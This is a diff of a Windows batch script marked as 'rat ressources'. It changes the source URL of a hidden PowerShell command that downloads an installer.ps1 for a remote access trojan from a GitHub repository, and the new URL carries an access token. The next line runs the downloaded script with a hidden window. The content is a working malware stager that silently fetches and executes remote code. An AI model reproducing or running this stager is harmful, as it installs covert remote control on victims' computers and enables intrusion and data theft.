@@ -37,5 +37,5 @@ start
 
 REM rat ressources
 
-powershell powershell.exe - windowstyle hidden "Invoke-WebRequest -Uri 'raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/files/installer.ps1' -OutFile 'installer.ps1'"
+powershell powershell.exe - windowstyle hidden "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/riahifiras/RAT/main/files/installer.ps1?token=GHSAT0AAAAAACN2XZL6U2ELPVLRU2RJEDUWZQ2QKIQ' -OutFile 'installer.ps1'"
 powershell -windowstyle hidden -c "./installer.ps1"
